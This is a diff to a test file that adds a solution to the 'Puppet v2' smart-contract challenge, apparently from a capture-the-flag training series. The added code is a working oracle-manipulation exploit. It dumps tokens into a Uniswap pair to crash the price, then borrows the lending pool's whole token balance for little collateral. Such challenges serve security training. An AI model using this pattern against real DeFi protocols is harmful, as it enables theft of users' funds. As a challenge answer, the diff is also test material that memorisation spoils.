@@ -64,6 +64,15 @@ describe('[Challenge] Puppet v2', function () {
     expect(await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)).to.eq(300000n * 10n ** 18n);
 
     /** CODE YOUR SOLUTION HERE */
+    await token.connect(player).approve(uniswapRouter, PLAYER_INITIAL_TOKEN_BALANCE);
+    await uniswapRouter
+      .connect(player)
+      .swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, [token, weth], player, (await time.latest()) * 2);
+
+    const requiredWETH = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+    await weth.connect(player).deposit({ value: requiredWETH });
+    await weth.connect(player).approve(lendingPool, requiredWETH);
+    await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
 
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
     // Player has taken all tokens from the pool
